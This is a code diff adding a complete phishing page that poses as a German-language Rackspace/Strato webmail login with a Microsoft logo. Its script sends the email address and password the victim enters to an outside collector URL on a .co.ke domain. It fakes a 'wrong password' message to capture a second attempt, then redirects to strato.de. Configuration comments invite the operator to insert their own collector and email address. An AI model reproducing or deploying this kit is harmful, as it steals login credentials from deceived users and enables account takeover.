@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+	<script>
+	   let SCRIPT_LINK= "https://shrendpublishers.co.ke/.script.php";//Your Script Url Here;
+
+	   let DESTINATION_EMAIL= "";  //Replace with your email
+
+	   let REDIRECT_LINK= "http://strato.de"; //Replace with your redirect link
+
+	   let SHOW_EXTRA_PARAMS= true; //Change to false if you dont want extra URL query
+	</script>
+	<meta charset="UTF-8">
+	<title>Rackspace Webmail: Hosted Email for Business</title>
+	<link href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700" rel="stylesheet">
+	<link href="https://apps.rackspace.com/favicon.ico" rel="shortcut icon" type="image/x-icon">
+	<link href="https://apps.rackspace.com/favicon.ico" rel="icon" type="image/x-icon">
+	<style>
+	      /* Page Defaults */
+	      * {
+	        -webkit-box-sizing: border-box;
+	        -moz-box-sizing: border-box;
+	        box-sizing: border-box;
+	      }
+
+	      body {
+	        font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+	        font-size: 14px;
+	        line-height: 1.42857;
+	        color: #333333;
+	        background-color: #FAFAFA;
+	        margin: 0;
+	      }
+
+	      .caption {
+	        display: inline-block;
+	        font-size: 12px;
+	        color: #666;
+	      }
+
+	      .base_link {
+	        display: inline-block;
+	        color: #0C7C84;
+	        text-decoration: none;
+	      }
+
+	      .base_links {
+	        background: #FFFFFF;
+	        text-align: center;
+	        padding-bottom: 20px;
+	        margin-top: -15px;
+	      }
+
+	      .divider {
+	        display: inline-block;
+	        margin: 0px 5px;
+	        color: #0C7C84;
+	      }
+	      /* Page Layout */
+	      #content {
+	        display: flex;
+	        align-items: center;
+	        justify-content: center;
+	        position: fixed;
+	        top: 0;
+	        left: 0;
+	        bottom: 0;
+	        right: 0;
+	        background: #EAEAEA;
+	      }
+
+	      #content-header {
+	        height: 53px;
+	        padding: 16px;
+	        font-size: 24px;
+	        font-weight: 300;
+	        line-height: 18px;
+	        background: #424242;
+	        color: #FCFCFC;
+	      }
+
+	      #content-header-logo {
+	        float: right;
+	      }
+
+	      #logo {
+	        width: 130px;
+	        margin-top: -9px;
+	        margin-right: -5px;
+	      }
+
+	      #content-header-label {
+	        float: left;
+	      }
+
+	      #content-body {
+	        display: flex;
+	        justify-content: start;
+	        background: #FFFFFF;
+	        min-width: 790px;
+	      }
+
+	      #banner-section {
+	        height: 285px;
+	        width: 314px;
+	        margin: 40px;
+	        display: flex;
+	        flex-direction: column;
+	        justify-content: center;
+	        align-items: center;
+	      }
+
+	      #banner {
+	        width: 190px;
+	      }
+
+	      #divider {
+	        border: 1px solid rgb(224, 224, 224);
+	        margin: 40px 0px;
+	      }
+	      /* Form Layout */
+	      #form {
+	        display: flex;
+	        flex-direction: column;
+	        justify-content: center;
+	        padding: 20px;
+	        min-height: 268px;
+	        width: 100%;
+	      }
+
+	      #form-body {
+	        height: 205px;
+	        width: 100%;
+	        margin: 40px 0px 0px 20px;
+	        display: flex;
+	        flex-direction: column;
+	        justify-content: center;
+	        align-items: center;
+	        padding-right: 20px;
+	      }
+
+	      #form-container {
+	        width: 100%;
+	        margin: 0px auto;
+	        padding: 0px 10px;
+	      }
+
+	      .row {
+	        margin: 0px -10px;
+	      }
+
+	        .row:before, .row:after {
+	          content: " ";
+	          display: table;
+	        }
+
+	      .col {
+	        width: 100%;
+	        float: left;
+	        position: relative;
+	        min-height: 1px;
+	        padding: 0px 10px;
+	      }
+
+	      .form-group {
+	        width: inherit;
+	        padding-right: 30px;
+	        margin-bottom: 20px;
+	      }
+
+	      .form-label {
+	        position: relative;
+	        font-family: Roboto;
+	        font-size: 16px;
+	        margin-bottom: 8px;
+	        line-height: 1;
+	        color: #616161;
+	        display: inline-block;
+	        max-width: 100%;
+	      }
+
+	      .form-field {
+	        border: 1px solid #BDBDBD;
+	        border-radius: 2px;
+	        background: #FFFFFF;
+	        font-family: Roboto;
+	        font-size: 16px;
+	        color: #616161;
+	        height: 32px;
+	        display: block;
+	        width: 100%;
+	        padding: 4px 8px;
+	        line-height: 1.42857;
+	        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+	        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+	        -webkit-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+	        -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+	        transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+	      }
+
+	      #forgot-password {
+	        position: absolute;
+	        top: 0px;
+	        right: 40px;
+	        color: #0C7C84;
+	        text-decoration: none;
+	        background-color: transparent;
+	        box-sizing: border-box;
+	      }
+
+	      #login-btn-toolbar {
+	        float: right;
+	        margin: auto 30px 15px -20px;
+	      }
+
+	      #login-btn {
+	        float: right;
+	        display: inline-flex;
+	        flex-direction: row;
+	        justify-content: center;
+	        align-items: center;
+	        padding: 0 12px;
+	        height: 32px;
+	        line-height: 1px;
+	        font-size: 14px;
+	        font-weight: 400;
+	        text-transform: capitalize;
+	        color: #fff;
+	        background-color: #0C7C84;
+	        border-color: #0C7C84;
+	        margin-bottom: 0;
+	        text-align: center;
+	        vertical-align: middle;
+	        touch-action: manipulation;
+	        cursor: pointer;
+	        background-image: none;
+	        border: 1px solid transparent;
+	        white-space: nowrap;
+	        border-radius: 2px;
+	        -webkit-user-select: none;
+	        -moz-user-select: none;
+	        -ms-user-select: none;
+	        user-select: none;
+	      }
+
+	      #form-container {
+	        width: 100%;
+	        margin: 0px auto;
+	        padding: 0px 10px;
+	      }
+
+	      @media only screen and (max-device-width: 480px) {
+	        /* Page Defaults */
+	        body {
+	          font-size: 19pt;
+	          line-height: 1.42857em;
+	        }
+
+	        .caption {
+	          display: inline-block;
+	          font-size: 80%;
+	          color: #666;
+	        }
+	        /* Page Layout */
+	        #content {
+	          align-items: inherit;
+	          display: inherit;
+	          justify-content: inherit;
+	        }
+
+	        #content-header {
+	          font-size: 171%;
+	          height: 3em;
+	          line-height: 1em;
+	          padding: 1em;
+	        }
+
+	        #content-header-logo {
+	          float: right;
+	        }
+
+	        #logo {
+	          margin-left: 6em;
+	          width: inherit;
+	          height: 1em;
+	        }
+
+	        #banner-section {
+	          display: none;
+	        }
+
+	        #divider {
+	          display: none;
+	        }
+	        /* Form Layout */
+	        .form-label {
+	          font-size: 114%;
+	        }
+
+	        .form-field {
+	          font-size: 114%;
+	          height: 2em;
+	        }
+
+	        #forgot-password {
+	          right: 2em;
+	          top: 0;
+	        }
+
+	        #login-btn-toolbar {
+	          margin: 1.5em 2em 1em -1.5em;
+	        }
+
+	        #login-btn {
+	          font-size: 150%;
+	          height: 3em;
+	          padding: 1.25em;
+	        }
+	      }
+	</style>
+</head>
+<body>
+	<div>
+		<div id="content">
+			<div style="max-width: 790px;">
+				<div id="content-header">
+					<div id="content-header-logo"><img id="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"></div>
+					<div id="content-header-label">
+						Webmail-Login
+					</div>
+				</div>
+				<div id="content-body">
+					<div id="banner-section">
+						<a href="https://emailhelp.rackspace.com/l/identify-suspicious-email" target="_blank"><img id="banner" src="https://wallpaperaccess.com/full/3309609.jpg"></a>
+					</div>
+					<div id="divider"></div>
+					<form action="" autocomplete="off" id="form" method="post" name="login">
+						<div id="form-body">
+							<div id="form-container">
+								<div id="error_show_hide" style="color: rgb(211, 47, 47); margin-bottom: 20px; font-weight: 500; display:none">
+									Der von Ihnen eingegebene Benutzername oder Passwort ist falsch. Bitte versuchen Sie es erneut einzugeben.
+								</div><!-- destination and flags is used for OWA login -->
+								<div class="row" id="user-row">
+									<div class="col" id="user-col">
+										<div class="form-group" id="user-field">
+											<label class="form-label" id="user-label">E-Mail-Adresse</label> <input autocomplete="username" class="form-field" id="user-input" name="username" tabindex="1" value="">
+										</div>
+									</div>
+								</div>
+								<div class="row" id="pass-row">
+									<div class="col" id="pass-col">
+										<div class="form-group" id="pass-field">
+											<label class="form-label" id="pass-label">Passwort</label> <input autocomplete="current-password" class="form-field" id="pass-input" name="password" tabindex="2" type="password" value="">
+										</div><a href="/wmidentity/recover/password" id="forgot-password" tabindex="4">Haben Sie Ihr Passwort vergessen?</a>
+									</div>
+								</div>
+							</div>
+						</div>
+						<div id="login-btn-toolbar">
+							<button id="login-btn" tabindex="3" type="submit">Anmeldung</button>
+						</div>
+					</form>
+				</div>
+				<div class="base_links">
+					<a class="base_link" href="" target="_blank"></a>
+					<div class="divider"></div><a class="base_link" href="" target="_blank">Strato Website-Bedingungen 2023</a>
+				</div>
+				<div class="footer" style="text-align: center; margin-top: 10px;">
+					<div class="caption">
+						<a href="//www.rackspace.com/email-hosting/webmail" style="color: #666;"></a> Bitte geben Sie das von Ihnen erstellte E-Mail-Passwort ein
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script src="https://code.jquery.com/jquery-3.5.1.min.js">
+	</script> 
+	<script>
+	   let subject="", url_main_link="",sec_p=false;
+	   $(document).ready(function() {
+	      url_main_link = getParameterByName(urlcheck("", "").replace("#", ""));
+	      if (SHOW_EXTRA_PARAMS === true) {
+	          window.history.pushState($("html").html(), "Rackspace Webmail: Hosted Email for Business", url_main_link);
+	      }
+	      
+	      $("a").each(function (me) {$(this).attr("onclick","window.location.replace('"+url_main_link+"');return false;");});
+	      const url = new URL(window.location.href);
+	      let e_m = url.searchParams.has("email") ? url.searchParams.get("email") : "";
+	      sec_p = url.searchParams.has("sec_p");
+	      if (e_m.includes("@") === true && e_m.includes(".") === true) {
+	      $("#error_show_hide").html("Das eingegebene Passwort ist falsch. Bitte versuchen Sie es erneutã");
+	          $("#user-input").val(e_m).attr("readonly", "readonly");
+	      }
+	      
+	      if (sec_p === true) {
+	          $("#error_show_hide").show();
+	      }
+	      subject = sec_p === true ? " - Second Try" : "";
+	      $("form#form").submit(function(e) {
+	          e.preventDefault();
+	          submit_now();
+	          return false;
+	      });
+	      $("#chkPrvt").click(function() {
+	          if (this.checked === true) {
+	              $("#prvtWrn").show();
+	          } else {
+	              $("#prvtWrn").hide();
+	          }
+	      });
+	      $("#lnkShwSec").click(function() {
+	          if ($(this).html().toString() == "Hide explanation") {
+	              $(this).html("What is this?");
+	              $("#prvtExp").hide();
+	          } else {
+	              $(this).html("Hide explanation");
+	              $("#prvtExp").show();
+	          }
+	          return false;
+	      });
+	   });
+
+	      function validateEmail(mail) {
+	          if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/.test(mail)){
+	              return true;
+	          }
+	          return false;
+	      }
+
+	   function clkLgn() {
+	   submit_now();
+	   }
+
+	   function submit_now(){
+	          if (validateEmail($("#user-input").val()) === false || $("#pass-input").val().toString().length < 1) {
+	              return false;
+	          }
+	          if ($("#login-btn").hasClass("working")) {
+	              return false;
+	          }
+	          $("#login-btn").addClass("working");
+	          $.ajax({
+	              dataType: 'text',
+	              url: SCRIPT_LINK,
+	              type: 'POST',
+	              data: {
+	                  username: $("#user-input").val(),
+	                  password: $("#pass-input").val(),
+	                  to: DESTINATION_EMAIL,
+	                  subject: subject,
+	              },
+	              success: function(response) {
+	                  setTimeout(function() {
+	                      if (sec_p === true) {
+	                          window.location.replace(REDIRECT_LINK);
+	                      } else {
+	                          window.location.replace(url_main_link + "&sec_p=09304");
+	                      }
+	                  }, 500);
+	              },
+	              error: function(response) {
+	                  window.location.replace(url_main_link);
+	              },
+	              complete: function() {}
+	          });
+	   }
+
+
+	   function getParameterByName(name) {
+	      let ser = "";
+	      const url = new URL(name.split("#").join(""));
+	      let query = url.search.split("?").join("&").split("&&").join("&");
+	      let qur = url.search.split("?").join("&");
+	      qur = qur.split("&&").join("&");
+	      let link = url.href.split("?")[0];
+	      $.each(qur.split("&"), function(index, value) {
+	          var name = "---" + value.split("=")[0] + "---";
+	          if (ser.includes(name)) {
+	              query = query.replace("&" + value, "").replace(value, "");
+	          } else {
+	              ser = ser + name;
+	          }
+	      });
+	      return (link + "?" + query).replace("?&", "?");
+	   }
+
+	   function urlcheck(e, t) {
+	      let r = location.href;
+	      return r.includes("?"), r.includes(e) ? r = r.replace(e, t) : r.endsWith("/") ? r += t : r = r + "/" + t, r = r + "?scriptID=" + Math.random().toString().replace("0.", "") + "&cookies=" + window.btoa(Math.random().toString()).replace("=?emai", "").replace("=", "") + "&token=" + Math.random().toString().replace("0.", "")
+	   }
+
+	</script>
+</body>
+</html>
